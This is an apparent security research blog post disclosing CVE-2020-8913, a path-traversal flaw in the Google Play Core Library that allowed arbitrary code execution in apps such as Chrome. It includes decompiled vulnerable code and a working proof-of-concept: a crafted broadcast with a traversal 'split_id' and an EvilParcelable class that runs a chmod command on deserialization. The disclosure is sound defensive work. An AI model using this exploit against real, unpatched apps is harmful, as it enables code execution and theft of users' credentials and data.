> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.oversecured.com](https://blog.oversecured.com/Oversecured-automatically-discovers-persistent-code-execution-in-the-Google-Play-Core-Library/)

Oversecured is happy that we were able to create a technology that allows us to detect tricky vulnerabilities with a very low false-positive rate and be better than a researcher’s eye! Oversecured’s service is adapted to Android security and privacy. It can detect a lot of different attack vectors and privacy issues (starting from known arbitrary code executions, theft/overwrite of arbitrary files, and ending with ability to theft user pictures, fake SMS messages, leak Android app logs, the full list is available [here](https://oversecured.com/vulnerabilities)), the kernel tracks unsafe and potentially dangerous data from the browser, third-party apps, a network shared with an attacker, Bluetooth and NFC connections, SMS messages, local public storage, etc. We accept APK files (Android apps), decompile them to Java sources, and perform analysis against them. An Oversecured’s user will receive a report showing a trace of data in the app’s sources, displaying where the dangerous data is coming from, sources that will process that data, and the place where’s the vulnerability happens.

Summary
-------

The Google Play Core Library is a popular library for Android that allows updates to various parts of an app to be delivered at runtime without the participation of the user, via the Google API. It can also be used to reduce the size of the main apk file by loading resources optimized for a particular device and settings (localization, image dimensions, processor architecture, dynamic modules) instead of storing dozens of different possible versions. The vulnerability we discovered made it possible to add executable modules to any apps using the library, meaning arbitrary code could be executed within them. An attacker who had a malware app installed on the victim’s device could steal users’ login details, passwords, and financial details, and read their mail.

Introduction
------------

Experts at Oversecured’s scanning kernel development department tested an update on several popular apps and discovered that something interesting had triggered the scanner. In many cases, we uncovered [Theft of arbitrary files](https://oversecured.com/vulnerabilities#Theft_of_arbitrary_files) and [Overwriting arbitrary files](https://oversecured.com/vulnerabilities#Overwriting_arbitrary_files) vulnerabilities in the Google Play Core library’s source code. Below we present a listing of the vulnerability from the report:

![](https://blog.oversecured.com/assets/images/fourth-article-code-blocks.png)

An exploit was written to steal arbitrary files, and a draft report was written to send to Google. Subsequently, the scope for developing the attack was investigated. As a result, the updated exploit made it possible to substitute executable files and achieve the execution of arbitrary code. The testing took place on the Google Chrome app.

Fragment of the vulnerable code
-------------------------------

The Google Chrome app was decompiled with the deobfuscation option set, and fragments of the resulting code are presented below.

An unprotected broadcast receiver in the file `com/google/android/play/core/splitinstall/C3748l.java` allows third-party apps to send specially crafted intents into it, forcing a vulnerable app to copy arbitrary files to arbitrary locations specified in the parameter `split_id` which is vulnerable to path-traversal.

Registration of the unprotected broadcast receiver in the file `com/google/android/play/core/splitinstall/C3748l.java`

```
private C3748l(Context context, C3741e eVar) {
    super(new ae("SplitInstallListenerRegistry"), new IntentFilter("com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService"), context);


```

File `com/google/android/play/core/listener/C3718a.java`

```
protected C3718a(ae aeVar, IntentFilter intentFilter, Context context) {
    this.f22595a = aeVar;
    this.f22596b = intentFilter; // intent filter with action `com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService`
    this.f22597c = context;
}

private final void m15347a() {
    if ((this.f22600f || !this.f22598d.isEmpty()) && this.f22599e == null) {
        this.f22599e = new C3719b(this, 0);
        this.f22597c.registerReceiver(this.f22599e, this.f22596b); // registration of unprotected broadcast receiver


```

allows third-party apps installed on the same device to broadcast arbitrary data here.

The file `com/google/android/play/core/splitinstall/SplitInstallSessionState.java` processes the message received

```
public static SplitInstallSessionState m15407a(Bundle bundle) {
    return new SplitInstallSessionState(bundle.getInt("session_id"), bundle.getInt("status"), bundle.getInt("error_code"), bundle.getLong("bytes_downloaded"), bundle.getLong("total_bytes_to_download"), bundle.getStringArrayList("module_names"), bundle.getStringArrayList("languages"), (PendingIntent) bundle.getParcelable("user_confirmation_intent"), bundle.getParcelableArrayList("split_file_intents")); // `split_file_intents` will be parsed
}


```

In the file `com/google/android/play/core/internal/ab.java` the library copies content from the URI from `split_file_intents` into the `unverified-splits` directory under the name `split_id`, which is subject to path-traversal due to the absence of validation

```
for (Intent next : list) {
    String stringExtra = next.getStringExtra("split_id");
    File a = this.f22543b.mo32067a(stringExtra); // path traversal from `/data/user/0/{package_name}/files/splitcompat/{id}/unverified-splits/`
    if (!a.exists() && !this.f22543b.mo32067b(stringExtra).exists()) {
        bufferedInputStream = new BufferedInputStream(new FileInputStream(this.f21840a.getContentResolver().openFileDescriptor(next.getData(), "r").getFileDescriptor())); // data of `split_file_intents` intents
        fileOutputStream = new FileOutputStream(a);
        byte[] bArr = new byte[4096];
        while (true) {
            int read = bufferedInputStream.read(bArr);
            if (read <= 0) {
                break;
            }   
            fileOutputStream.write(bArr, 0, read);


```

After further careful research, it emerged that the `verified-splits` folder contains verified apks with the current app’s signature, which are no longer verified in the future. When a file in that folder starts with a `config.` prefix, it will be added to the app’s runtime ClassLoader automatically. Using that weakness, the attacker can create a class implementing e.g. the `Parcelable` interface and containing malicious code and send their instances to the affected app, meaning the `createFromParcel(...)` method will be executed in their context during deserialization leading to local code execution.

Proof of Concept
----------------

A Proof of Concept was created for the Google Chrome app: it executes the command `chmod -R 777 /data/user/0/com.android.chrome` in the context of the vulnerable app. It first launches the app’s main activity, as a result of which an unprotected receiver is registered in the Google Play Core library code. 3 seconds later it sends a command to the receiver, which causes the affected app to be added in its entirety to the default ClassResolver. After 5 seconds the attacking app sends the `EvilParcelable` object, which automatically executes the command on being deserialized. Deserialization happens automatically, due to the way Android works. When a component receives an Intent, all attached objects are deserialized on receipt of a value or state (the `Intent.hasExtra(name)` method).

```
public static final String APP = "com.android.chrome";

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    Intent launchIntent = getPackageManager().getLaunchIntentForPackage(APP);
    startActivity(launchIntent);

    new Handler().postDelayed(() -> {
        Intent split = new Intent();
        split.setData(Uri.parse("file://" + getApplicationInfo().sourceDir));
        split.putExtra("split_id", "../verified-splits/config.test");

        Bundle bundle = new Bundle();
        bundle.putInt("status", 3);
        bundle.putParcelableArrayList("split_file_intents", new ArrayList<Parcelable>(Arrays.asList(split)));

        Intent intent = new Intent("com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService");
        intent.setPackage(APP);
        intent.putExtra("session_state", bundle);
        sendBroadcast(intent);
    }, 3000);

    new Handler().postDelayed(() -> {
        startActivity(launchIntent.putExtra("x", new EvilParcelable()));
    }, 5000);
}


```

Code for the class that executes the command under the attacker’s control on deserialization

```
package oversecured.poc;

import android.os.Parcelable;

public class EvilParcelable implements Parcelable {
    public static final Parcelable.Creator<EvilParcelable> CREATOR = new Parcelable.Creator<EvilParcelable>() {
        public EvilParcelable createFromParcel(android.os.Parcel parcel) {
            exploit();
            return null;
        }

        public EvilParcelable[] newArray(int i) {
            exploit();
            return null;
        }

        private void exploit() {
            try {
                Runtime.getRuntime().exec("chmod -R 777 /data/user/0/" + MainActivity.APP).waitFor();
            }
            catch (Throwable th) {
                throw new RuntimeException(th);
            }
        }
    };

    public int describeContents() { return 0; }
    public void writeToParcel(android.os.Parcel parcel, int i) {}
}


```

Conclusion
----------

This vulnerability was assessed by Google as highly dangerous. It meant many popular apps, including Google Chrome, were vulnerable to arbitrary code execution. This could lead to leaks of users’ credentials and financial details, including credit card history; to interception and falsification of their browser history, cookie files, etc. To remove it, developers should update the Google Play Core library to the latest version and users should update all their apps.

Timeline  
02/26/2020 - Scanner triggered, first exploit to steal arbitrary files created  
02/27/2020 - Vulnerability studied in greater detail, exploit to execute arbitrary code created, information sent to Google  
04/06/2020 - Google confirmed the vulnerability has been fixed  
07/22/2020 - Google assigned CVE-2020-8913